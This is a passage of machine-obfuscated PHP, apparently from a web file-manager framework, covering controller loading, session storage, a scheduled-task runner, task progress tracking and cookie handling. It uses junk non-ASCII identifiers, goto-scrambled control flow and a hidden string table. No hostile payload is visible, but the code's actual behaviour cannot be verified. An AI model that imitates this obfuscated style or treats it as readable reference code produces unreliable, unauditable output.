(substr($AÙ“‡®Âå, -5) == $EÓÎ±¨õáÛ[9]) { $C’ßµ…µ•É = substr($EõÇíŠŠ—ğ[0], 0, -5); return Model($C’ßµ…µ•É); } else { $aä‰áâà¨î = $EõÇíŠŠ—ğ[0] . $EõÇíŠŠ—ğ[1]; $d±Ì—ÕÕ = CONTROLLER_DIR . $EõÇíŠŠ—ğ[0] . $EÓÎ±¨õáÛ[4] . $EõÇíŠŠ—ğ[1] . $EÓÎ±¨õáÛ[14]; } } $Fµëª£ã†¿ = strtolower($aä‰áâà¨î); goto dªÍ²¾³º; dªÍ²¾³º: if (isset($Aæ†Ëë£½á[$Fµëª£ã†¿])) { return $Aæ†Ëë£½á[$Fµëª£ã†¿]; } if (is_file($d±Ì—ÕÕ)) { include_once $d±Ì—ÕÕ; } if (!class_exists($aä‰áâà¨î)) { return actionCallError("\133{$C’ßµ…µ•É}\x20\x3d\x3e\40{$aä‰áâà¨î}\135\x20\x63\154\141\163\x73\x20\156\157\x74\40\x65\170\x69\x73\x74\x73\41"); } goto C™Ş¼Ğ¥ÕÃ; eÇäÉ§§²: } function ActionApply($CœÃ‹¼İ‰Ê, $DÆ®„É·Ÿ = array()) { goto dŸĞâœÀ¯É; bäø ™ºÄÄ: $E‚‘Ö¬›ã = substr($CœÃ‹¼İ‰Ê, 0, $BùÑ¹¨íƒ¢); $f¤Ã«Š«¥Ç = substr($CœÃ‹¼İ‰Ê, $BùÑ¹¨íƒ¢ + 1); $A‚†‰¿ä±å = Action($E‚‘Ö¬›ã); goto d±ºç¼¡ó‚; dŸĞâœÀ¯É: if (is_array($CœÃ‹¼İ‰Ê)) { return call_user_func_array($CœÃ‹¼İ‰Ê, $DÆ®„É·Ÿ); } if (function_exists($CœÃ‹¼İ‰Ê)) { return call_user_func_array($CœÃ‹¼İ‰Ê, $DÆ®„É·Ÿ); } $BùÑ¹¨íƒ¢ = strrpos($CœÃ‹¼İ‰Ê, $_SERVER[·ü][5]); goto bäø ™ºÄÄ; d±ºç¼¡ó‚: if (!method_exists($A‚†‰¿ä±å, $f¤Ã«Š«¥Ç)) { return actionCallError("{$CœÃ‹¼İ‰Ê}\40\155\145\x74\150\157\x64\x20\x6e\x6f\164\40\145\170\151\163\x74\x73\41"); } $dÛîï»†™ˆ = call_user_func_array(array($A‚†‰¿ä±å, $f¤Ã«Š«¥Ç), $DÆ®„É·Ÿ); return $dÛîï»†™ˆ; goto dãä”·³´; dãä”·³´: } function actionCallError($CâÃùœØ ) { return write_log($CâÃùœØ , $_SERVER[·ü][15]); } goto eõ¢ùÃ‡½; eèÛÑ¢¤èí: register_shutdown_function($_SERVER[·ü][32]); set_error_handler($_SERVER[·ü][46], $D¥¦¾ö ¿ƒ); if (function_exists($_SERVER[·ü][47])) { set_exception_handler($_SERVER[·ü][48]); } goto b¸‰À­¾­ì; dõ×£‡ˆ¤: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto b—³ÇâìÙ‚; cäæ¾†Íó: $a†¥Íßœè = $BÄ÷àŒ²–[$b« ìÅ©¤¤]; $f¨ÜÍù³ø = $BÄ÷àŒ²–[$a¹»Ù‘ÕÚ[764]]; switch ($b« ìÅ©¤¤) { case $a¹»Ù‘ÕÚ[27]: self::$handle = Model($a¹»Ù‘ÕÚ[765]); break; case $a¹»Ù‘ÕÚ[766]: self::$handle = new CacheRedis($a†¥Íßœè, $f¨ÜÍù³ø); break; case $a¹»Ù‘ÕÚ[767]: self::$handle = new CacheMemcached($a†¥Íßœè, $f¨ÜÍù³ø); break; case $a¹»Ù‘ÕÚ[177]: $a†¥Íßœè[$a¹»Ù‘ÕÚ[85]] = $a†¥Íßœè[$a¹»Ù‘ÕÚ[85]] . $a¹»Ù‘ÕÚ[1406]; self::$handle = new CacheFile($a†¥Íßœè, $f¨ÜÍù³ø); default: break; } goto bÌÚ®ÈìŞ; FÔòÎ¦ÜÃ‘: $BÄ÷àŒ²– = $GLOBALS[$a¹»Ù‘ÕÚ[16]][$a¹»Ù‘ÕÚ[346]]; self::$sessionTime = $BÄ÷àŒ²–[$a¹»Ù‘ÕÚ[1403]]; $bğ—ï´’Ìæ = isset($GLOBALS[$a¹»Ù‘ÕÚ[1404]]) ? $GLOBALS[$a¹»Ù‘ÕÚ[1404]] : SESSION_ID; goto cÆ¬ƒà³Ã¾; b—³ÇâìÙ‚: $a¹»Ù‘ÕÚ =& $_SERVER[çŞáÓæÚô‚Ô‡]; static $DÂ†¨—…õ = false; if ($DÂ†¨—…õ) { return $DÂ†¨—…õ; } goto FÔòÎ¦ÜÃ‘; cÆ¬ƒà³Ã¾: if (self::$sessionSign) { } else { if (Cookie::get($bğ—ï´’Ìæ)) { self::$sessionSign = Cookie::get($bğ—ï´’Ìæ); } else { self::$sessionSign = guid(); } } Cookie::setSafe($bğ—ï´’Ìæ, self::$sessionSign, self::$sessionTime); $b« ìÅ©¤¤ = $BÄ÷àŒ²–[$a¹»Ù‘ÕÚ[1405]]; goto cäæ¾†Íó; bÌÚ®ÈìŞ: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $DÂ†¨—…õ = new self(); return $DÂ†¨—…õ; goto dÔÀ‹¿†Íï; dÔÀ‹¿†Íï: } public static function sign($Aë™‹¡¿¶Ã = false) { $Aë™‹¡¿¶Ã && (self::$sessionSign = $Aë™‹¡¿¶Ã); self::init(); return self::$sessionSign; } public static function set($bÙÁ·ÚÎ–, $c›‰æø··Î = false) { self::init(); if (is_array($bÙÁ·ÚÎ–)) { foreach ($bÙÁ·ÚÎ– as $E¢‡ã‹º¥ö => $bš–‡î¼) { array_set_value(self::$data, $E¢‡ã‹º¥ö, $bš–‡î¼); } } else { array_set_value(self::$data, $bÙÁ·ÚÎ–, $c›‰æø··Î); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($D Æªİó¬à = false) { self::init(); if (!$D Æªİó¬à) { return self::$data; } return array_get_value(self::$data, $D Æªİó¬à); } public static function remove($cÙ½¹á‡ô) { self::init(); unset(self::$data[$cÙ½¹á‡ô]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[çŞáÓæÚô‚Ô‡][769])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto fóßÏ³ÑÀ¶; Aô…—¾…Æ¹: while (!0) { self::cacheClear(); if (self::valueGet($c™Åí£²“é[698]) != $c™Åí£²“é[93]) { self::valueSet($c™Åí£²“é[1407], $c™Åí£²“é[479]); self::log($c™Åí£²“é[1411]); die; } self::valueSet($c™Åí£²“é[1407], $c™Åí£²“é[93]); self::valueSet($c™Åí£²“é[1408], time()); self::taskRunAll(); sleep(self::valueGet($c™Åí£²“é[1412])); } goto b¹Ö¬³„³¸; fóßÏ³ÑÀ¶: $c™Åí£²“é =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (self::valueGet($c™Åí£²“é[698]) != $c™Åí£²“é[93]) { return; } if (self::valueGet($c™Åí£²“é[1407]) == $c™Åí£²“é[93]) { $E—”¨’ãİ = self::valueGet($c™Åí£²“é[1408]); if (time() - $E—”¨’ãİ > 3600 * 2) { self::restart(); } return; } goto fÄÌÔ§²´Ã; fÄÌÔ§²´Ã: http_close(); self::valueSet($c™Åí£²“é[1407], $c™Åí£²“é[93]); Hook::bind($c™Åí£²“é[1409], $c™Åí£²“é[1410]); goto Aô…—¾…Æ¹; b¹Ö¬³„³¸: } public static function restart() { $dÇ¾°ó“õ =& $_SERVER[çŞáÓæÚô‚Ô‡]; http_close(); self::valueSet($dÇ¾°ó“õ[698], $dÇ¾°ó“õ[479]); sleep(self::valueGet($dÇ¾°ó“õ[1412]) + 5); self::valueSet($dÇ¾°ó“õ[1407], $dÇ¾°ó“õ[479]); self::valueSet($dÇ¾°ó“õ[698], $dÇ¾°ó“õ[93]); } public static function shutdownEvent() { $A½ŞùÄã¢ =& $_SERVER[çŞáÓæÚô‚Ô‡]; self::valueSet($A½ŞùÄã¢[1407], $A½ŞùÄã¢[479]); self::log($A½ŞùÄã¢[1413]); } public static function config($dºÇÙÛ±Ü‚, $FŠ³¹—ÚÓâ) { $f†ÃÅª =& $_SERVER[çŞáÓæÚô‚Ô‡]; $fİ‹›æºâ = 20; $FŠ³¹—ÚÓâ = intval($FŠ³¹—ÚÓâ) <= $fİ‹›æºâ ? $fİ‹›æºâ : intval($FŠ³¹—ÚÓâ); self::valueSet($f†ÃÅª[698], $dºÇÙÛ±Ü‚); self::valueSet($f†ÃÅª[1412], $FŠ³¹—ÚÓâ); } private static function taskRunAll() { $eÙ…¹À¸Ö =& $_SERVER[çŞáÓæÚô‚Ô‡]; $EÆì¥Ã¦¸ö = Model($eÙ…¹À¸Ö[1414])->listData(); $eÈôÆÑÇïß = count($EÆì¥Ã¦¸ö); for ($C÷á‰­âæ = 0; $C÷á‰­âæ < $eÈôÆÑÇïß; $C÷á‰­âæ++) { $eŒ¢¦–Ú› = $EÆì¥Ã¦¸ö[$C÷á‰­âæ]; if ($eŒ¢¦–Ú›[$eÙ…¹À¸Ö[1415]] != $eÙ…¹À¸Ö[93]) { continue; } if (!self::taskTimeCheck($eŒ¢¦–Ú›)) { continue; } self::taskRun($eŒ¢¦–Ú›); } Hook::trigger($eÙ…¹À¸Ö[1416]); } private static function taskTimeCheck($b¢ÁŞöµˆ) { goto cŸÏ’ƒÅ¯Ñ; Bã‚¹¡è: switch ($eçÚæÖÍÌô[$b½–Å‘Î–¢[39]]) { case $b½–Å‘Î–¢[1423]: if (time() - $aƒå…ª„ñ < 3600 * 24 * 30) { return !1; } if ($eçÚæÖÍÌô[$b½–Å‘Î–¢[1423]] == date($b½–Å‘Î–¢[1424]) && $dËí¿ã„¦¸) { return !0; } break; case $b½–Å‘Î–¢[1425]: if (time() - $aƒå…ª„ñ < 3600 * 24 * 7) { return !1; } $aÔóìÊ¹«„ = date($b½–Å‘Î–¢[1426]) == 0 ? 7 : date($b½–Å‘Î–¢[1426]); if ($eçÚæÖÍÌô[$b½–Å‘Î–¢[1425]] == $aÔóìÊ¹«„ && $dËí¿ã„¦¸) { return !0; } break; case $b½–Å‘Î–¢[1418]: if (time() - $aƒå…ª„ñ < 3600 * 24) { return !1; } if ($dËí¿ã„¦¸) { return !0; } break; case $b½–Å‘Î–¢[1427]: if (time() - $aƒå…ª„ñ >= floatval($eçÚæÖÍÌô[$b½–Å‘Î–¢[1427]]) * 60) { return !0; } break; default: break; } return !1; goto AËÆç£æ…ˆ; cŸÏ’ƒÅ¯Ñ: $b½–Å‘Î–¢ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $eçÚæÖÍÌô = json_decode($b¢ÁŞöµˆ[$b½–Å‘Î–¢[200]], !0); $aƒå…ª„ñ = intval($b¢ÁŞöµˆ[$b½–Å‘Î–¢[1408]]); goto CÒÕºíÂÃƒ; CÒÕºíÂÃƒ: $c”òŸíé„í = strtotime($b½–Å‘Î–¢[1417] . $eçÚæÖÍÌô[$b½–Å‘Î–¢[1418]] . $b½–Å‘Î–¢[1419]) - strtotime($b½–Å‘Î–¢[1420]); $Cñ‘šƒ÷¡ = time() - strtotime(date($b½–Å‘Î–¢[1421]) . $b½–Å‘Î–¢[1422]); $dËí¿ã„¦¸ = $Cñ‘šƒ÷¡ >= $c”òŸíé„í && $Cñ‘šƒ÷¡ <= $c”òŸíé„í + 3600; goto Bã‚¹¡è; AËÆç£æ…ˆ: } public static function taskRun($DÁŠÔåéÒ) { goto dÒ³¡¬‡—; Câ¼êóôÀÜ: Model($fŞ‚Õ‰è„[1432])->add(array($fŞ‚Õ‰è„[1433] => $fŞ‚Õ‰è„[43], $fŞ‚Õ‰è„[1434] => $fŞ‚Õ‰è„[479], $fŞ‚Õ‰è„[39] => $fŞ‚Õ‰è„[1435] . $DÁŠÔåéÒ[$fŞ‚Õ‰è„[376]], $fŞ‚Õ‰è„[1436] => json_encode(array($fŞ‚Õ‰è„[38] => $DÁŠÔåéÒ[$fŞ‚Õ‰è„[38]], $fŞ‚Õ‰è„[1437] => timeFloat() - $BŒ†…Ô‡ Ò, $fŞ‚Õ‰è„[290] => $e½ŠÉğ½ÎŞ)))); self::log($fŞ‚Õ‰è„[1438] . $DÁŠÔåéÒ[$fŞ‚Õ‰è„[376]] . $fŞ‚Õ‰è„[1439] . $e½ŠÉğ½ÎŞ); return !0; goto B¨£ËÈ©–³; DŒç·ÜÓ: $BŒ†…Ô‡ Ò = timeFloat(); $e½ŠÉğ½ÎŞ = $fŞ‚Õ‰è„[43]; switch ($DÁŠÔåéÒ[$fŞ‚Õ‰è„[39]]) { case $fŞ‚Õ‰è„[304]: $EªÈ¸„Ú¯Ô = url_request($DÁŠÔåéÒ[$fŞ‚Õ‰è„[1431]], $fŞ‚Õ‰è„[226], !1, !1, !1, !1, 5); $e½ŠÉğ½ÎŞ = strlen($EªÈ¸„Ú¯Ô); break; case $fŞ‚Õ‰è„[225]: $e½ŠÉğ½ÎŞ = Hook::apply($DÁŠÔåéÒ[$fŞ‚Õ‰è„[1431]]); default: break; } goto Câ¼êóôÀÜ; dÒ³¡¬‡—: $fŞ‚Õ‰è„ =& $_SERVER[çŞáÓæÚô‚Ô‡]; self::log($fŞ‚Õ‰è„[1428] . $DÁŠÔåéÒ[$fŞ‚Õ‰è„[376]] . $fŞ‚Õ‰è„[1429] . $DÁŠÔåéÒ[$fŞ‚Õ‰è„[38]] . $fŞ‚Õ‰è„[1430] . $DÁŠÔåéÒ[$fŞ‚Õ‰è„[1431]]); Model($fŞ‚Õ‰è„[1414])->run($DÁŠÔåéÒ[$fŞ‚Õ‰è„[376]]); goto DŒç·ÜÓ; B¨£ËÈ©–³: } private static function valueGet($bŠ‚‹ì¼Èœ) { $e²‚…“¿¸Š =& $_SERVER[çŞáÓæÚô‚Ô‡]; $d‘ëĞÀ÷±… = $e²‚…“¿¸Š[1440]; $Cğìï“å¤¹ = Model($e²‚…“¿¸Š[1441])->get($bŠ‚‹ì¼Èœ, $d‘ëĞÀ÷±…); if (is_null($Cğìï“å¤¹)) { Model($e²‚…“¿¸Š[1441])->set($e²‚…“¿¸Š[1412], 10, $d‘ëĞÀ÷±…); Model($e²‚…“¿¸Š[1441])->set($e²‚…“¿¸Š[698], $e²‚…“¿¸Š[93], $d‘ëĞÀ÷±…); Model($e²‚…“¿¸Š[1441])->set($e²‚…“¿¸Š[1407], $e²‚…“¿¸Š[479], $d‘ëĞÀ÷±…); $Cğìï“å¤¹ = Model($e²‚…“¿¸Š[1441])->get($bŠ‚‹ì¼Èœ, $d‘ëĞÀ÷±…); } return $Cğìï“å¤¹; } private static function valueSet($Dƒ‚†‘¹ª«, $F¹Œ¬õ•îæ) { $dÉ‰¶İ‡ï™ =& $_SERVER[çŞáÓæÚô‚Ô‡]; return Model($dÉ‰¶İ‡ï™[1441])->set($Dƒ‚†‘¹ª«, $F¹Œ¬õ•îæ, $dÉ‰¶İ‡ï™[1440]); } protected static function log($Aã¦¦ƒ‘°‹) { write_log($Aã¦¦ƒ‘°‹, $_SERVER[çŞáÓæÚô‚Ô‡][1442]); } private static function cacheClear() { $F‰ö±ÃÌï³ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $cø´×²·‘ = Model($F‰ö±ÃÌï³[1441])->cacheKey($F‰ö±ÃÌï³[1440]); Cache::clearMemory($cø´×²·‘); Model($F‰ö±ÃÌï³[1414])->cacheClear(); } } class Task { const STATYS_STOP = "\163\x74\x6f\x70"; const STATYS_RUNNING = "\x72\165\x6e\156\151\156\x67"; const STATYS_KILL = "\153\x69\154\154"; public $task; public function __destruct() { $this->end(); } public function __construct($C«’Á„à»˜, $Aİµ²è¢÷× = '', $bÛÊ©ôœÚÃ = 0, $DµÙ½ÁğøŞ = '') { goto bŠÇÍ”Š£Ü; D®Â„‰’™: Hook::trigger($C±£Á„ğ‡[1454], $this->task); $this->task[$C±£Á„ğ‡[1448]] = timeFloat(); goto dİïŠã‘­±; bŠÇÍ”Š£Ü: $C±£Á„ğ‡ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (self::get($C«’Á„à»˜)) { return; } $this->task = array($C±£Á„ğ‡[376] => $C«’Á„à»˜, $C±£Á„ğ‡[1443] => USER_ID, $C±£Á„ğ‡[1349] => $DµÙ½ÁğøŞ, $C±£Á„ğ‡[39] => $Aİµ²è¢÷×, $C±£Á„ğ‡[985] => $C±£Á„ğ‡[43], $C±£Á„ğ‡[983] => $bÛÊ©ôœÚÃ, $C±£Á„ğ‡[997] => 0, $C±£Á„ğ‡[1444] => 0, $C±£Á„ğ‡[1445] => 0, $C±£Á„ğ‡[1446] => timeFloat(), $C±£Á„ğ‡[1447] => 0, $C±£Á„ğ‡[1448] => 0, $C±£Á„ğ‡[1449] => 0, $C±£Á„ğ‡[1450] => 0, $C±£Á„ğ‡[698] => $C±£Á„ğ‡[1407]); goto BÀùÏğŸó—; BÀùÏğŸó—: Hook::bind($C±£Á„ğ‡[1409], array($this, $C±£Á„ğ‡[1451])); Hook::bind($C±£Á„ğ‡[1452], array($this, $C±£Á„ğ‡[1453])); $this->startAfter(); goto D®Â„‰’™; dİïŠã‘­±: } public function end() { goto a‹ÛÔºÇâŒ; D¯÷ŒŒµã¿: $C’ĞÁÁ¥ìŞ = timeFloat() - $this->task[$BİñéŠÕğ÷[1446]]; self::log($BİñéŠÕğ÷[1455] . $this->task[$BİñéŠÕğ÷[376]] . $BİñéŠÕğ÷[1456] . $C’ĞÁÁ¥ìŞ . $BİñéŠÕğ÷[1457]); Hook::unbind($BİñéŠÕğ÷[1409], array($this, $BİñéŠÕğ÷[1451])); goto CÁçÉòŠÌ; a‹ÛÔºÇâŒ: $BİñéŠÕğ÷ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$this->task) { return; } if ($this->task[$BİñéŠÕğ÷[1448]]) { self::valueSet($this->task[$BİñéŠÕğ÷[376]], !1); } goto D¯÷ŒŒµã¿; CÁçÉòŠÌ: Hook::unbind($BİñéŠÕğ÷[1452], array($this, $BİñéŠÕğ÷[1453])); $this->endAfter(); $this->task = !1; goto eïÊ÷ƒß‰; eïÊ÷ƒß‰: } public function update($e˜Ñ¨§ã = 0) { goto fĞê‡ö‰åÕ; fĞê‡ö‰åÕ: $CÔ˜íĞÀ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $DÆƒéÊ‰à° =& $this->task; if (!$DÆƒéÊ‰à°) { return; } goto D‡Ÿ¨šÖ©‹; D‡Ÿ¨šÖ©‹: $DÆƒéÊ‰à°[$CÔ˜íĞÀ[997]] += $e˜Ñ¨§ã; $DÆƒéÊ‰à°[$CÔ˜íĞÀ[1447]] = timeFloat(); if ($DÆƒéÊ‰à°[$CÔ˜íĞÀ[983]]) { if ($DÆƒéÊ‰à°[$CÔ˜íĞÀ[983]] < $DÆƒéÊ‰à°[$CÔ˜íĞÀ[997]]) { $DÆƒéÊ‰à°[$CÔ˜íĞÀ[983]] = $DÆƒéÊ‰à°[$CÔ˜íĞÀ[997]]; } $Eñ°Â¨ÙÑœ = timeFloat() - $DÆƒéÊ‰à°[$CÔ˜íĞÀ[1446]] - $DÆƒéÊ‰à°[$CÔ˜íĞÀ[1449]]; $DÆƒéÊ‰à°[$CÔ˜íĞÀ[1444]] = $DÆƒéÊ‰à°[$CÔ˜íĞÀ[997]] / $DÆƒéÊ‰à°[$CÔ˜íĞÀ[983]]; $DÆƒéÊ‰à°[$CÔ˜íĞÀ[1445]] = $DÆƒéÊ‰à°[$CÔ˜íĞÀ[997]] / $Eñ°Â¨ÙÑœ; if ($DÆƒéÊ‰à°[$CÔ˜íĞÀ[1444]] > 0) { $DÆƒéÊ‰à°[$CÔ˜íĞÀ[1450]] = $Eñ°Â¨ÙÑœ * (1 - $DÆƒéÊ‰à°[$CÔ˜íĞÀ[1444]]) / $DÆƒéÊ‰à°[$CÔ˜íĞÀ[1444]]; } $DÆƒéÊ‰à°[$CÔ˜íĞÀ[1450]] = $DÆƒéÊ‰à°[$CÔ˜íĞÀ[1450]] <= 0 ? 0 : $DÆƒéÊ‰à°[$CÔ˜íĞÀ[1450]]; } goto c®Òæ¹¢±í; bëŒ½‡²›Œ: Hook::trigger($CÔ˜íĞÀ[1461], $DÆƒéÊ‰à°); self::valueSet($DÆƒéÊ‰à°[$CÔ˜íĞÀ[376]], $DÆƒéÊ‰à°); goto AÏö¬İ£; EÖ¦õ£©ª¦: $a‰ˆ•¨ì–Ù = self::get($DÆƒéÊ‰à°[$CÔ˜íĞÀ[376]]); $BŒ¾ÆÙ”Œğ = $a‰ˆ•¨ì–Ù[$CÔ˜íĞÀ[698]]; if ($BŒ¾ÆÙ”Œğ == self::STATYS_KILL) { $EëÎ¦ï×ÃË = array($CÔ˜íĞÀ[1458] => LNG($CÔ˜íĞÀ[1459]), $CÔ˜íĞÀ[1039] => !1); Cache::set($CÔ˜íĞÀ[1460] . $this->task[$CÔ˜íĞÀ[376]], $EëÎ¦ï×ÃË, 30); $this->end(); die; } else { if ($BŒ¾ÆÙ”Œğ == self::STATYS_STOP) { $E™×é»òÈ = 2; $a‰ˆ•¨ì–Ù[$CÔ˜íĞÀ[1449]] += $E™×é»òÈ; self::valueSet($DÆƒéÊ‰à°[$CÔ˜íĞÀ[376]], $a‰ˆ•¨ì–Ù); sleep($E™×é»òÈ); $this->update(); return; } } goto A½¢Ô¥ªæ; c®Òæ¹¢±í: $this->updateAfter(); $cŞ‰Õò¦³ = 0.2; if (timeFloat() - $DÆƒéÊ‰à°[$CÔ˜íĞÀ[1448]] < $cŞ‰Õò¦³) { return; } goto EÖ¦õ£©ª¦; A½¢Ô¥ªæ: $DÆƒéÊ‰à°[$CÔ˜íĞÀ[698]] = $BŒ¾ÆÙ”Œğ ? $BŒ¾ÆÙ”Œğ : $DÆƒéÊ‰à°[$CÔ˜íĞÀ[698]]; $DÆƒéÊ‰à°[$CÔ˜íĞÀ[1449]] = $a‰ˆ•¨ì–Ù[$CÔ˜íĞÀ[1449]] ? $a‰ˆ•¨ì–Ù[$CÔ˜íĞÀ[1449]] : 0; $DÆƒéÊ‰à°[$CÔ˜íĞÀ[1448]] = timeFloat(); goto bëŒ½‡²›Œ; AÏö¬İ£: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($F÷æËÀÏß÷) { $f»øÉ±‰ÆŒ =& $_SERVER[çŞáÓæÚô‚Ô‡]; Cache::set($f»øÉ±‰ÆŒ[1460] . $this->task[$f»øÉ±‰ÆŒ[376]], $F÷æËÀÏß÷, 60); return $F÷æËÀÏß÷; } public static function get($Fîæãª§À¨) { return self::valueGet($Fîæãª§À¨); } public static function listData() { $C“Š×¯¼²Ü = self::valueGet(); return array_sort_by($C“Š×¯¼²Ü, $_SERVER[çŞáÓæÚô‚Ô‡][1446], !0); } public static function kill($b¨ôé‘ïğ¾) { return self::changeStatus($b¨ôé‘ïğ¾, self::STATYS_KILL); } public static function stop($c¼«¹îƒÆß) { return self::changeStatus($c¼«¹îƒÆß, self::STATYS_STOP); } public static function restart($b£Ø¤¥ÎÉİ) { return self::changeStatus($b£Ø¤¥ÎÉİ, self::STATYS_RUNNING); } public static function killAll() { $f‹ªÃÖ¦“Ã =& $_SERVER[çŞáÓæÚô‚Ô‡]; $d†ÊòááñÁ = self::listData(); foreach ($d†ÊòááñÁ as $EÛÍÉÑÇ¦“) { self::kill($EÛÍÉÑÇ¦“[$f‹ªÃÖ¦“Ã[376]]); } sleep(2); foreach ($d†ÊòááñÁ as $EÛÍÉÑÇ¦“) { self::valueSet($EÛÍÉÑÇ¦“[$f‹ªÃÖ¦“Ã[376]], !1); } } private static function changeStatus($fƒâÜ¹ä‘Ï, $a¶”ƒÅ¿ò) { goto A§†é¸öòÎ; e‡‰Èåß: return !0; goto c†òàÅ; A§†é¸öòÎ: $d‘¿è·«Çğ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $F©Óˆò¢ = self::valueGet($fƒâÜ¹ä‘Ï); if (!$F©Óˆò¢) { return !1; } goto DÈóƒ²³¨®; DÈóƒ²³¨®: $F©Óˆò¢[$d‘¿è·«Çğ[698]] = $a¶”ƒÅ¿ò; self::valueSet($fƒâÜ¹ä‘Ï, $F©Óˆò¢); self::log($d‘¿è·«Çğ[1462] . $F©Óˆò¢[$d‘¿è·«Çğ[376]] . $d‘¿è·«Çğ[1463] . $a¶”ƒÅ¿ò); goto e‡‰Èåß; c†òàÅ: } public static function valueGet($c«ÁàÀÆö = false) { $D†ÏñåÚªÃ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($c«ÁàÀÆö) { $CÌâ¾¹¬ = Model($D†ÏñåÚªÃ[408])->where(array($D†ÏñåÚªÃ[99] => $c«ÁàÀÆö, $D†ÏñåÚªÃ[39] => $D†ÏñåÚªÃ[1464]))->find(); return $CÌâ¾¹¬ ? json_decode($CÌâ¾¹¬[$D†ÏñåÚªÃ[368]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($FÊªê¦°ç« = false) { goto F«à¼‰; BàæïåİÌæ: $aºä·‰É¨Å = Model($CèØœøâí“[408])->where($Eš¬Úì´Âè)->select(); $aºä·‰É¨Å = $aºä·‰É¨Å ? $aºä·‰É¨Å : array(); foreach ($aºä·‰É¨Å as $CËŠÂ™’ªØ => $f¾Æ‰‰ñ·ˆ) { $aºä·‰É¨Å[$CËŠÂ™’ªØ] = json_decode($f¾Æ‰‰ñ·ˆ[$CèØœøâí“[368]], !0); } goto B‚äŸ‡ŸÅâ; F«à¼‰: $CèØœøâí“ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Eš¬Úì´Âè = array($CèØœøâí“[39] => $CèØœøâí“[1464]); if ($FÊªê¦°ç«) { $Eš¬Úì´Âè[$CèØœøâí“[1443]] = $FÊªê¦°ç«; } goto BàæïåİÌæ; B‚äŸ‡ŸÅâ: return $aºä·‰É¨Å; goto fÔ„ÔÍ½¼; fÔ„ÔÍ½¼: } public static function valueSet($cœ¾ùÕ–Ú…, $f©áì¸öÀØ) { goto f½÷·ÊÏÌÀ; dßÔóÏ‡Ì: Model($b¸Î¼‘Çùù[408])->add($d¿ÛØ…Å¤‚, array(), !0); goto eäÈ¢î¸¨‡; f½÷·ÊÏÌÀ: $b¸Î¼‘Çùù =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$f©áì¸öÀØ) { return Model($b¸Î¼‘Çùù[408])->where(array($b¸Î¼‘Çùù[99] => $cœ¾ùÕ–Ú…, $b¸Î¼‘Çùù[39] => $b¸Î¼‘Çùù[1464]))->delete(); } $BäÃóğ„Š‚ = json_encode($f©áì¸öÀØ); goto aâÁëŸ§·¯; aâÁëŸ§·¯: if (!$BäÃóğ„Š‚) { ob_start(); var_dump($f©áì¸öÀØ); $d«º²àİ¶— = ob_get_clean(); self::log($b¸Î¼‘Çùù[1465] . json_encode_force($d«º²àİ¶—)); } if (!$cœ¾ùÕ–Ú… || !$f©áì¸öÀØ[$b¸Î¼‘Çùù[376]]) { return !1; } $d¿ÛØ…Å¤‚ = array($b¸Î¼‘Çùù[39] => $b¸Î¼‘Çùù[1464], $b¸Î¼‘Çùù[1443] => USER_ID, $b¸Î¼‘Çùù[99] => $cœ¾ùÕ–Ú…, $b¸Î¼‘Çùù[368] => $BäÃóğ„Š‚); goto dßÔóÏ‡Ì; eäÈ¢î¸¨‡: } public static function log($a·¿öóÜ·) { write_log($a·¿öóÜ·, $_SERVER[çŞáÓæÚô‚Ô‡][1466]); } } goto f¸•«ßíö; E§ƒÉÚøí: define($_SERVER[çŞáÓæÚô‚Ô‡][238], 1); define($_SERVER[çŞáÓæÚô‚Ô‡][239], 0); define($_SERVER[çŞáÓæÚô‚Ô‡][240], 2); goto CÙºâœçİë; f­éŠì®”»: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($a…é¼ŒŸ×‡ = '', $a …»ã¤Ş = 0) { if (is_string($a…é¼ŒŸ×‡) && $a…é¼ŒŸ×‡ != $_SERVER[çŞáÓæÚô‚Ô‡][43]) { $this->prefix = $a…é¼ŒŸ×‡; } if (is_numeric($a …»ã¤Ş) && $a …»ã¤Ş > 0) { $this->expire = $a …»ã¤Ş; } } public static function getInstance() { static $fÒ–‚¬†ÂÎ; if ($fÒ–‚¬†ÂÎ === null) { $fÒ–‚¬†ÂÎ = new self(); } return $fÒ–‚¬†ÂÎ; } private static $sameCookieSet = array(); public static function set($CÚ´‹®ÀÕ, $bİæíŒë¢µ, $AóñÕÆË°† = 0, $eŒÖ¤¶ó‹â = false, $CÇ‹¿éÒ“£ = false) { goto a¶’÷¿İ¸; f»Ù‘İøìÉ: self::$sameCookieSet[$CÚ´‹®ÀÕ] = $bİæíŒë¢µ . $AóñÕÆË°†; if (!$CÇ‹¿éÒ“£) { $CÇ‹¿éÒ“£ = str_replace(HOST, $Bá±í›øÇÇ[43], APP_HOST); $CÇ‹¿éÒ“£ = _get($GLOBALS, $Bá±í›øÇÇ[803], $CÇ‹¿éÒ“£); } $A§ò­›§‹´ = $Bá±í›øÇÇ[43]; goto Fá·¢±Ë‘¿; Fá·¢±Ë‘¿: setcookie($CÚ´‹®ÀÕ, $bİæíŒë¢µ, time() + $AóñÕÆË°†, $Bá±í›øÇÇ[18] . trim($CÇ‹¿éÒ“£, $Bá±í›øÇÇ[18]) 